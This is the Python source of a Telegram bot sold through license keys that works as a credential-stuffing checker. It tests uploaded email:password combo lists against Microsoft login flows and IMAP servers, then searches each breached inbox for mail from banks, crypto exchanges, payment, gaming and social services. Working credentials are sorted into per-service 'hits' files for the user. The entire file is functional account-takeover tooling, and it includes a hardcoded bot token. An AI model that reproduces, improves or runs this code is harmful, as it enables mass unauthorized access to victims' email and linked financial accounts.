import os
import sys
import asyncio
import sqlite3
import uuid
import re
import time
import random
import zipfile
import requests
import pycountry
import ssl
import imaplib
import socket
from email.header import decode_header
from datetime import datetime, timedelta
from pathlib import Path
from threading import Lock, Semaphore
from concurrent.futures import ThreadPoolExecutor
from collections import defaultdict

from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup, InputFile
from telegram.error import BadRequest
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    ContextTypes,
    MessageHandler,
    CallbackQueryHandler,
    filters,
)

# --- Configuration ---
BOT_TOKEN = "8725091064:AAGxtIXAq-kdzjRRTAfWGqMCvNG4ycvCDy4"  # Replace with actual token
ADMIN_ID = 7225123280  # Replace with actual admin user ID

# --- Constants & Global State ---
DATABASE = "bot_data.db"
OUTPUT_DIR = "Accounts"
HITS_DIR = "hits"
lock = Lock()
service_hits = {}
hit = 0
bad = 0
retry = 0
total_combos = 0
processed = 0
checked_accounts = set()
rate_limit_semaphore = Semaphore(500)
is_checking = False
stop_checking = False

# Service definitions from 3.py
SERVICES = {
    "Facebook": {"sender": "security@facebookmail.com", "file": "Hits_Facebook.txt", "category": "social"},
    "Instagram": {"sender": "security@mail.instagram.com", "file": "Hits_Instagram.txt", "category": "social"},
    "TikTok": {"sender": "register@account.tiktok.com", "file": "Hits_TikTok.txt", "category": "social"},
    "Twitter": {"sender": "info@x.com", "file": "Hits_Twitter.txt", "category": "social"},
    "LinkedIn": {"sender": "security-noreply@linkedin.com", "file": "Hits_LinkedIn.txt", "category": "social"},
    "Pinterest": {"sender": "no-reply@pinterest.com", "file": "Hits_Pinterest.txt", "category": "social"},
    "Reddit": {"sender": "noreply@reddit.com", "file": "Hits_Reddit.txt", "category": "social"},
    "Snapchat": {"sender": "no-reply@accounts.snapchat.com", "file": "Hits_Snapchat.txt", "category": "social"},
    "VK": {"sender": "noreply@vk.com", "file": "Hits_VK.txt", "category": "social"},
    "WeChat": {"sender": "no-reply@wechat.com", "file": "Hits_WeChat.txt", "category": "social"},
    "WhatsApp": {"sender": "no-reply@whatsapp.com", "file": "Hits_WhatsApp.txt", "category": "messaging"},
    "Telegram": {"sender": "telegram.org", "file": "Hits_Telegram.txt", "category": "messaging"},
    "Discord": {"sender": "noreply@discord.com", "file": "Hits_Discord.txt", "category": "messaging"},
    "Signal": {"sender": "no-reply@signal.org", "file": "Hits_Signal.txt", "category": "messaging"},
    "Line": {"sender": "no-reply@line.me", "file": "Hits_Line.txt", "category": "messaging"},
    "Netflix": {"sender": "info@account.netflix.com", "file": "Hits_Netflix.txt", "category": "streaming"},
    "Spotify": {"sender": "no-reply@spotify.com", "file": "Hits_Spotify.txt", "category": "streaming"},
    "Twitch": {"sender": "no-reply@twitch.tv", "file": "Hits_Twitch.txt", "category": "streaming"},
    "YouTube": {"sender": "no-reply@youtube.com", "file": "Hits_YouTube.txt", "category": "streaming"},
    "Disney+": {"sender": "no-reply@disneyplus.com", "file": "Hits_DisneyPlus.txt", "category": "streaming"},
    "Hulu": {"sender": "account@hulu.com", "file": "Hits_Hulu.txt", "category": "streaming"},
    "HBO Max": {"sender": "no-reply@hbomax.com", "file": "Hits_HBOMax.txt", "category": "streaming"},
    "Amazon Prime": {"sender": "auto-confirm@amazon.com", "file": "Hits_AmazonPrime.txt", "category": "streaming"},
    "Apple TV+": {"sender": "no-reply@apple.com", "file": "Hits_AppleTV.txt", "category": "streaming"},
    "Crunchyroll": {"sender": "noreply@crunchyroll.com", "file": "Hits_Crunchyroll.txt", "category": "streaming"},
    "Amazon": {"sender": "auto-confirm@amazon.com", "file": "Hits_Amazon.txt", "category": "shopping"},
    "eBay": {"sender": "newuser@nuwelcome.ebay.com", "file": "Hits_eBay.txt", "category": "shopping"},
    "Shopify": {"sender": "no-reply@shopify.com", "file": "Hits_Shopify.txt", "category": "shopping"},
    "Etsy": {"sender": "transaction@etsy.com", "file": "Hits_Etsy.txt", "category": "shopping"},
    "AliExpress": {"sender": "no-reply@aliexpress.com", "file": "Hits_AliExpress.txt", "category": "shopping"},
    "Walmart": {"sender": "no-reply@walmart.com", "file": "Hits_Walmart.txt", "category": "shopping"},
    "PayPal": {"sender": "service@paypal.com.br", "file": "Hits_PayPal.txt", "category": "finance"},
    "Binance": {"sender": "do-not-reply@ses.binance.com", "file": "Hits_Binance.txt", "category": "finance"},
    "Coinbase": {"sender": "no-reply@coinbase.com", "file": "Hits_Coinbase.txt", "category": "finance"},
    "Revolut": {"sender": "no-reply@revolut.com", "file": "Hits_Revolut.txt", "category": "finance"},
    "Venmo": {"sender": "no-reply@venmo.com", "file": "Hits_Venmo.txt", "category": "finance"},
    "Cash App": {"sender": "no-reply@cash.app", "file": "Hits_CashApp.txt", "category": "finance"},
    "Steam": {"sender": "noreply@steampowered.com", "file": "Hits_Steam.txt", "category": "gaming"},
    "Xbox": {"sender": "xboxreps@engage.xbox.com", "file": "Hits_Xbox.txt", "category": "gaming"},
    "PlayStation": {"sender": "reply@txn-email.playstation.com", "file": "Hits_PlayStation.txt", "category": "gaming"},
    "Epic Games": {"sender": "help@acct.epicgames.com", "file": "Hits_EpicGames.txt", "category": "gaming"},
    "EA Sports": {"sender": "EA@e.ea.com", "file": "Hits_EASports.txt", "category": "gaming"},
    "Ubisoft": {"sender": "noreply@ubisoft.com", "file": "Hits_Ubisoft.txt", "category": "gaming"},
    "Riot Games": {"sender": "no-reply@riotgames.com", "file": "Hits_RiotGames.txt", "category": "gaming"},
    "Valorant": {"sender": "noreply@valorant.com", "file": "Hits_Valorant.txt", "category": "gaming"},
    "Roblox": {"sender": "accounts@roblox.com", "file": "Hits_Roblox.txt", "category": "gaming"},
    "Minecraft": {"sender": "noreply@mojang.com", "file": "Hits_Minecraft.txt", "category": "gaming"},
    "Fortnite": {"sender": "noreply@epicgames.com", "file": "Hits_Fortnite.txt", "category": "gaming"},
    "Google": {"sender": "no-reply@accounts.google.com", "file": "Hits_Google.txt", "category": "tech"},
    "Microsoft": {"sender": "account-security-noreply@accountprotection.microsoft.com", "file": "Hits_Microsoft.txt", "category": "tech"},
    "Apple": {"sender": "no-reply@apple.com", "file": "Hits_Apple.txt", "category": "tech"},
    "GitHub": {"sender": "noreply@github.com", "file": "Hits_GitHub.txt", "category": "tech"},
    "Dropbox": {"sender": "no-reply@dropbox.com", "file": "Hits_Dropbox.txt", "category": "tech"},
    "Zoom": {"sender": "no-reply@zoom.us", "file": "Hits_Zoom.txt", "category": "tech"},
    "Slack": {"sender": "no-reply@slack.com", "file": "Hits_Slack.txt", "category": "tech"},
    "NordVPN": {"sender": "no-reply@nordvpn.com", "file": "Hits_NordVPN.txt", "category": "security"},
    "ExpressVPN": {"sender": "no-reply@expressvpn.com", "file": "Hits_ExpressVPN.txt", "category": "security"},
    "Airbnb": {"sender": "no-reply@airbnb.com", "file": "Hits_Airbnb.txt", "category": "travel"},
    "Uber": {"sender": "no-reply@uber.com", "file": "Hits_Uber.txt", "category": "travel"},
    "Booking.com": {"sender": "no-reply@booking.com", "file": "Hits_Booking.txt", "category": "travel"},
    "Uber Eats": {"sender": "no-reply@ubereats.com", "file": "Hits_UberEats.txt", "category": "food"},
    "DoorDash": {"sender": "no-reply@doordash.com", "file": "Hits_DoorDash.txt", "category": "food"},
}

CATEGORIES = {
    "social": "📱 SOCIAL MEDIA",
    "messaging": "💬 MESSAGING",
    "streaming": "📺 STREAMING",
    "shopping": "🛒 SHOPPING",
    "finance": "💰 FINANCE & CRYPTO",
    "gaming": "🎮 GAMING",
    "tech": "💻 TECH & PRODUCTIVITY",
    "security": "🔒 SECURITY & VPN",
    "travel": "✈️ TRAVEL",
    "food": "🍔 FOOD DELIVERY"
}

# --- Database Setup ---
def init_db():
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute('''CREATE TABLE IF NOT EXISTS keys
                 (key_str TEXT PRIMARY KEY, days INTEGER, expiry_date TEXT, user_id INTEGER)''')
    conn.commit()
    conn.close()

def add_key(key_str, days):
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("INSERT OR REPLACE INTO keys (key_str, days) VALUES (?, ?)", (key_str, days))
    conn.commit()
    conn.close()

def activate_key(key_str, user_id):
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("SELECT days, user_id, expiry_date FROM keys WHERE key_str = ?", (key_str,))
    row = c.fetchone()
    if row:
        days, existing_user, expiry = row
        if existing_user and existing_user != user_id:
            conn.close()
            return False, "This key is already used by another user."
        
        if not expiry:
            expiry_date = (datetime.now() + timedelta(days=days)).strftime('%Y-%m-%d %H:%M:%S')
            c.execute("UPDATE keys SET user_id = ?, expiry_date = ? WHERE key_str = ?", (user_id, expiry_date, key_str))
            conn.commit()
            conn.close()
            return True, f"Key activated! Valid until {expiry_date}"
        else:
            conn.close()
            return True, f"Key already active! Valid until {expiry}"
            
    conn.close()
    return False, "Invalid key."

def is_authorized(user_id):
    if user_id == ADMIN_ID: return True
    conn = sqlite3.connect(DATABASE)
    c = conn.cursor()
    c.execute("SELECT expiry_date FROM keys WHERE user_id = ?", (user_id,))
    row = c.fetchone()
    conn.close()
    if row:
        expiry = datetime.strptime(row[0], '%Y-%m-%d %H:%M:%S')
        return datetime.now() < expiry
    return False

# IMAP domain mappings
IMAP_DOMAINS = {
    'gmail.com': {'server': 'imap.gmail.com', 'port': 993},
    'yahoo.com': {'server': 'imap.mail.yahoo.com', 'port': 993},
    'outlook.com': {'server': 'outlook.office365.com', 'port': 993},
    'hotmail.com': {'server': 'outlook.office365.com', 'port': 993},
    'aol.com': {'server': 'imap.aol.com', 'port': 993},
    'icloud.com': {'server': 'imap.mail.me.com', 'port': 993},
}

def get_imap_server(domain):
    if domain in IMAP_DOMAINS:
        return IMAP_DOMAINS[domain]['server'], IMAP_DOMAINS[domain]['port']
    return f"imap.{domain}", 993

# --- Checker Logic ---
def get_capture(email, password, access_token, cid, selected_service=None, session_id=None):
    global service_hits
    try:
        # Always save to general Hits_All.txt first
        all_hits_path = os.path.join(HITS_DIR, session_id, "Hits_All.txt")
        os.makedirs(os.path.dirname(all_hits_path), exist_ok=True)
        with lock:
            with open(all_hits_path, 'a', encoding='utf-8') as f:
                f.write(f"{email}:{password}\n")
        
        search_url = "https://outlook.live.com/search/api/v2/query"
        services_to_check = {selected_service: SERVICES[selected_service]} if selected_service else SERVICES
        
        for service_name, service_info in services_to_check.items():
            if stop_checking: break
            sender = service_info["sender"]
            payload = {
                "Cvid": str(uuid.uuid4()),
                "Scenario": {"Name": "owa.react"},
                "TimeZone": "UTC",
                "TextDecorations": "Off",
                "EntityRequests": [{
                    "EntityType": "Conversation",
                    "ContentSources": ["Exchange"],
                    "Filter": {"Or": [{"Term": {"DistinguishedFolderName": "msgfolderroot"}}]},
                    "From": 0,
                    "Query": {"QueryString": f"from:{sender}"},
                    "Size": 1,
                    "Sort": [{"Field": "Time", "SortDirection": "Desc"}]
                }]
            }
            headers = {
                'Authorization': f'Bearer {access_token}',
                'X-AnchorMailbox': f'CID:{cid}',
                'Content-Type': 'application/json'
            }
            try:
                r = requests.post(search_url, json=payload, headers=headers, timeout=10)
                if r.status_code == 200:
                    data = r.json()
                    if 'EntitySets' in data and data['EntitySets']:
                        entity_set = data['EntitySets'][0]
                        if 'ResultSets' in entity_set and entity_set['ResultSets']:
                            result_set = entity_set['ResultSets'][0]
                            if result_set.get('Total', 0) > 0:
                                output_path = os.path.join(HITS_DIR, session_id, service_info["file"])
                                os.makedirs(os.path.dirname(output_path), exist_ok=True)
                                with lock:
                                    with open(output_path, 'a', encoding='utf-8') as f:
                                        f.write(f"{email}:{password}\n")
                                    service_hits[service_name] = service_hits.get(service_name, 0) + 1
                else:
                    # Log failure to console for debugging
                    print(f"Search API error ({r.status_code}) for {email} / {service_name}")
            except Exception as e:
                print(f"Search error for {email} / {service_name}: {e}")
                continue
    except Exception as e:
        print(f"General capture error for {email}: {e}")

def _build_imap_or_query(senders):
    if not senders:
        return "(ALL)"
    if len(senders) == 1:
        return f'FROM "{senders[0]}"'
    return f'(OR FROM "{senders[0]}" {_build_imap_or_query(senders[1:])})'

def search_imap_inbox(imap_server, email, password, session_id):
    global service_hits
    try:
        # Select INBOX
        imap_server.select("INBOX", readonly=True)
        
        # We'll check for each service one by one or in small batches if OR is too complex
        # For simplicity and to match the Hotmail checker's per-service hit reporting, 
        # we'll search for each sender in the SERVICES dict.
        
        for service_name, service_info in SERVICES.items():
            if stop_checking: break
            sender = service_info["sender"]
            
            try:
                typ, data = imap_server.search(None, f'FROM "{sender}"')
                if typ == 'OK' and data[0]:
                    uids = data[0].split()
                    if uids:
                        # Service found! Save to file
                        output_path = os.path.join(HITS_DIR, session_id, service_info["file"])
                        os.makedirs(os.path.dirname(output_path), exist_ok=True)
                        with lock:
                            with open(output_path, 'a', encoding='utf-8') as f:
                                f.write(f"{email}:{password}\n")
                            service_hits[service_name] = service_hits.get(service_name, 0) + 1
            except:
                continue
    except:
        pass

def check_imap(email, password, session_id):
    try:
        domain = email.split('@')[1]
        server, port = get_imap_server(domain)
        
        context = ssl.create_default_context()
        context.check_hostname = False
        context.verify_mode = ssl.CERT_NONE
        
        with imaplib.IMAP4_SSL(host=server, port=port, ssl_context=context, timeout=15) as imap_server:
            typ, data = imap_server.login(email, password)
            if typ == 'OK':
                # Success! Save to Hits_IMAP.txt
                output_path = os.path.join(HITS_DIR, session_id, "Hits_IMAP.txt")
                os.makedirs(os.path.dirname(output_path), exist_ok=True)
                with lock:
                    with open(output_path, 'a', encoding='utf-8') as f:
                        f.write(f"{email}:{password}\n")
                    service_hits["IMAP"] = service_hits.get("IMAP", 0) + 1
                
                # Also save to Hits_All.txt
                all_hits_path = os.path.join(HITS_DIR, session_id, "Hits_All.txt")
                with lock:
                    with open(all_hits_path, 'a', encoding='utf-8') as f:
                        f.write(f"{email}:{password}\n")
                
                # NEW: Search inbox for keywords/senders like in the normal checker
                search_imap_inbox(imap_server, email, password, session_id)
                
                return "HIT"
            else:
                return "BAD"
    except Exception as e:
        # Check if it's a login failure vs a connection error
        err_str = str(e).lower()
        if "login failed" in err_str or "authentication failed" in err_str or "invalid credentials" in err_str:
            return "BAD"
        return "RETRY"

def check_account(email, password, selected_service=None, session_id=None):
    # Determine check mode
    if selected_service == "IMAP_CHECKER":
        return check_imap(email, password, session_id)
    
    # Existing Hotmail check logic
    try:
        session = requests.Session()
        url1 = f"https://odc.officeapps.live.com/odc/emailhrd/getidp?hm=1&emailAddress={email}"
        headers1 = {
            "X-OneAuth-AppName": "Outlook Lite",
            "X-Office-Version": "3.11.0-minApi24",
            "X-CorrelationId": str(uuid.uuid4()),
            "User-Agent": "Dalvik/2.1.0 (Linux; U; Android 9; SM-G975N Build/PQ3B.190801.08041932)",
            "Host": "odc.officeapps.live.com",
            "Connection": "Keep-Alive",
            "Accept-Encoding": "gzip"
        }
        r1 = session.get(url1, headers=headers1, timeout=15)
        if any(x in r1.text for x in ["Neither", "Both", "Placeholder", "OrgId"]) or "MSAccount" not in r1.text:
            return "BAD"
        
        time.sleep(0.3)
        url2 = f"https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?client_info=1&haschrome=1&login_hint={email}&mkt=en&response_type=code&client_id=e9b154d0-7658-433b-bb25-6b8e0a8a7c59&scope=profile%20openid%20offline_access%20https%3A%2F%2Foutlook.office.com%2FM365.Access&redirect_uri=msauth%3A%2F%2Fcom.microsoft.outlooklite%2Ffcg80qvoM1YMKJZibjBwQcDfOno%253D"
        r2 = session.get(url2, headers={"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"}, timeout=15)
        
        url_match = re.search(r'urlPost":"([^"]+)"', r2.text)
        ppft_match = re.search(r'name=\\"PPFT\\" id=\\"i0327\\" value=\\"([^"]+)"', r2.text)
        if not url_match or not ppft_match: return "BAD"
        
        post_url = url_match.group(1).replace("\\/", "/")
        ppft = ppft_match.group(1)
        login_data = f"i13=1&login={email}&loginfmt={email}&type=11&LoginOptions=1&passwd={password}&ps=2&PPFT={ppft}&PPSX=PassportR&NewUser=1&FoundMSAs=&fspost=0&i21=0&CookieDisclosure=0&IsFidoSupported=0&i19=9960"
        
        r3 = session.post(post_url, data=login_data, headers={"Content-Type": "application/x-www-form-urlencoded", "User-Agent": "Mozilla/5.0", "Origin": "https://login.live.com"}, allow_redirects=False, timeout=15)
        if any(x in r3.text for x in ["account or password is incorrect", "error", "Incorrect password", "Invalid credentials", "identity/confirm", "Abuse", "signedout", "locked"]):
            return "BAD"
            
        location = r3.headers.get("Location", "")
        code_match = re.search(r'code=([^&]+)', location)
        if not code_match: return "BAD"
        
        code = code_match.group(1)
        token_data = {"client_info": "1", "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59", "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D", "grant_type": "authorization_code", "code": code, "scope": "profile openid offline_access https://outlook.office.com/M365.Access"}
        r4 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, timeout=15)
        
        if r4.status_code != 200 or "access_token" not in r4.text: return "BAD"
        
        access_token = r4.json()["access_token"]
        mspcid = next((c.value for c in session.cookies if c.name == "MSPCID"), None)
        cid = mspcid.upper() if mspcid else str(uuid.uuid4()).upper()
        
        get_capture(email, password, access_token, cid, selected_service, session_id)
        return "HIT"
    except: return "RETRY"

def check_combo_wrapper(line, selected_service, session_id):
    global hit, bad, retry, processed, checked_accounts
    try:
        if stop_checking: 
            with lock: processed += 1
            return
            
        parts = line.split(":", 1)
        if len(parts) < 2:
            with lock: processed += 1
            return
            
        email, password = parts[0].strip(), parts[1].strip()
        account_id = f"{email}:{password}"
        
        # Immediate check and add to prevent duplicate checks if same line exists
        with lock:
            if account_id in checked_accounts:
                processed += 1
                return
            checked_accounts.add(account_id)

        with rate_limit_semaphore:
            time.sleep(random.uniform(0.01, 0.05))
            res = check_account(email, password, selected_service, session_id)
            with lock:
                if res == "HIT": hit += 1
                elif res == "BAD": bad += 1
                elif res == "RETRY": retry += 1
                processed += 1
    except Exception as e:
        print(f"Error in worker thread: {e}")
        with lock: processed += 1

# --- Bot Handlers ---
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("❌ You are not authorized. Use `/key [key]` to activate your access.")
        return
    
    keyboard = [
        [InlineKeyboardButton("Check All Hotmail Services", callback_data="mode_all")],
        [InlineKeyboardButton("Hotmail Specific Service", callback_data="mode_select")],
        [InlineKeyboardButton("Mixed Mail IMAP Checker", callback_data="mode_imap")]
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Welcome to WHotmail Bot!\nPlease select a check mode:", reply_markup=reply_markup)

async def key_command(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    args = context.args
    
    if user_id == ADMIN_ID and len(args) == 2:
        # Admin adding a key
        key_str, days = args[0], int(args[1])
        add_key(key_str, days)
        await update.message.reply_text(f"✅ Key `{key_str}` added for {days} days.", parse_mode="Markdown")
        return

    if len(args) == 1:
        # User activating a key
        success, msg = activate_key(args[0], user_id)
        await update.message.reply_text(msg)
        return

    await update.message.reply_text("Usage:\nAdmin: `/key [key] [days]`\nUser: `/key [key]`", parse_mode="Markdown")

async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    data = query.data
    
    if data == "mode_all":
        context.user_data["mode"] = "all"
        await query.edit_message_text("Mode set to: **All Hotmail Services**\nPlease upload your `combos.txt` file.", parse_mode="Markdown")
    elif data == "mode_imap":
        context.user_data["mode"] = "IMAP_CHECKER"
        await query.edit_message_text("Mode set to: **Mixed Mail IMAP Checker**\nPlease upload your `combos.txt` file.", parse_mode="Markdown")
    elif data == "mode_select":
        # Show category selection
        keyboard = []
        for cat_id, cat_name in CATEGORIES.items():
            keyboard.append([InlineKeyboardButton(cat_name, callback_data=f"cat_{cat_id}")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("Select a category:", reply_markup=reply_markup)
    elif data.startswith("cat_"):
        cat_id = data.split("_")[1]
        keyboard = []
        for s_name, s_info in SERVICES.items():
            if s_info["category"] == cat_id:
                keyboard.append([InlineKeyboardButton(s_name, callback_data=f"svc_{s_name}")])
        keyboard.append([InlineKeyboardButton("⬅️ Back", callback_data="mode_select")])
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text(f"Select a service in {CATEGORIES[cat_id]}:", reply_markup=reply_markup)
    elif data.startswith("svc_"):
        svc_name = data.split("_")[1]
        context.user_data["mode"] = svc_name
        await query.edit_message_text(f"Mode set to: **{svc_name}**\nPlease upload your `combos.txt` file.", parse_mode="Markdown")
    elif data == "stop_check":
        global stop_checking
        stop_checking = True
        await query.edit_message_text("🛑 **Stopping check...** Please wait.", parse_mode="Markdown")

async def handle_document(update: Update, context: ContextTypes.DEFAULT_TYPE):
    global is_checking, stop_checking, hit, bad, retry, processed, total_combos, service_hits, checked_accounts
    
    user_id = update.effective_user.id
    if not is_authorized(user_id):
        await update.message.reply_text("❌ Unauthorized.")
        return

    if is_checking:
        await update.message.reply_text("⚠️ A check is already in progress. Please wait.")
        return

    doc = update.message.document
    if not doc.file_name.endswith(".txt"):
        await update.message.reply_text("❌ Please upload a .txt file.")
        return

    try:
        file = await doc.get_file()
        file_content = await file.download_as_bytearray()
        lines = file_content.decode('utf-8', errors='ignore').splitlines()
        lines = [l.strip() for l in lines if ":" in l]
    except Exception as e:
        await update.message.reply_text(f"❌ Error reading file: {e}")
        return
    
    if not lines:
        await update.message.reply_text("❌ No valid combos found in file.")
        return

    mode = context.user_data.get("mode", "all")
    selected_service = None if mode == "all" else mode
    
    # Reset stats
    hit, bad, retry, processed = 0, 0, 0, 0
    total_combos = len(lines)
    service_hits = {}
    checked_accounts = set()
    is_checking = True
    stop_checking = False
    session_id = str(uuid.uuid4())[:8]

    # Create session hits directory
    session_hits_path = os.path.join(HITS_DIR, session_id)
    os.makedirs(session_hits_path, exist_ok=True)

    keyboard = [[InlineKeyboardButton("🛑 Stop Check", callback_data="stop_check")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    status_msg = await update.message.reply_text("🚀 Starting check...", reply_markup=reply_markup)
    
    # Run checker in a separate thread
    loop = asyncio.get_event_loop()
    
    async def update_status():
        last_text = ""
        while is_checking:
            try:
                progress = (processed / total_combos * 100) if total_combos > 0 else 0
                text = f"🛡 **WHotmail Bot Checking**\n\n"
                text += f"✅ **Hits:** {hit}\n"
                text += f"❌ **Bad:** {bad}\n"
                text += f"🔄 **Retry:** {retry}\n"
                text += f"📊 **Progress:** {processed}/{total_combos} ({progress:.1f}%)\n\n"
                
                if service_hits:
                    text += "🔍 **Services Found:**\n"
                    sorted_hits = sorted(service_hits.items(), key=lambda x: x[1], reverse=True)[:10]
                    for s, count in sorted_hits:
                        text += f"• {s}: {count}\n"
                
                if text != last_text:
                    await status_msg.edit_text(text, parse_mode="Markdown", reply_markup=reply_markup)
                    last_text = text
            except BadRequest as e:
                if "Message is not modified" not in str(e):
                    print(f"Status update Telegram error: {e}")
            except Exception as e:
                print(f"Status update general error: {e}")
            await asyncio.sleep(5)

    status_task = asyncio.create_task(update_status())

    def run_check():
        try:
            with ThreadPoolExecutor(max_workers=100) as executor:
                list(executor.map(lambda l: check_combo_wrapper(l, selected_service, session_id), lines))
        except Exception as e:
            print(f"Checker executor error: {e}")

    await loop.run_in_executor(None, run_check)
    
    is_checking = False
    status_task.cancel()
    
    # One last update to show 100% or final counts
    try:
        final_text = f"✅ **Check Completed!**\n\n" if not stop_checking else "🛑 **Check Stopped!**\n\n"
        final_text += f"✅ **Hits:** {hit}\n"
        final_text += f"❌ **Bad:** {bad}\n"
        final_text += f"🔄 **Retry:** {retry}\n"
        final_text += f"📊 **Final Progress:** {processed}/{total_combos}\n"
        await status_msg.edit_text(final_text, parse_mode="Markdown")
    except Exception as e:
        print(f"Final status update error: {e}")
    
    if hit > 0:
        try:
            # Zip and send
            zip_path = f"results_{session_id}.zip"
            zip_count = 0
            with zipfile.ZipFile(zip_path, 'w') as zipf:
                for root, dirs, files in os.walk(session_hits_path):
                    for f in files:
                        zipf.write(os.path.join(root, f), f)
                        zip_count += 1
            
            if zip_count > 0:
                with open(zip_path, 'rb') as f:
                    await update.message.reply_document(document=f, caption=f"Total Hits: {hit}")
            else:
                await update.message.reply_text(f"❌ Found {hit} hits but could not find the files to zip.")
            
            # Cleanup zip file
            if os.path.exists(zip_path):
                os.remove(zip_path)
        except Exception as e:
            await update.message.reply_text(f"❌ Error while zipping/sending results: {e}")
    else:
        await update.message.reply_text("❌ No hits found.")


if __name__ == "__main__":
    init_db()
    app = ApplicationBuilder().token(BOT_TOKEN).build()
    
    app.add_handler(CommandHandler("start", start))
    app.add_handler(CommandHandler("key", key_command))
    app.add_handler(CallbackQueryHandler(button_handler))
    app.add_handler(MessageHandler(filters.Document.ALL, handle_document))
    
    print("Bot started...")
    app.run_polling()
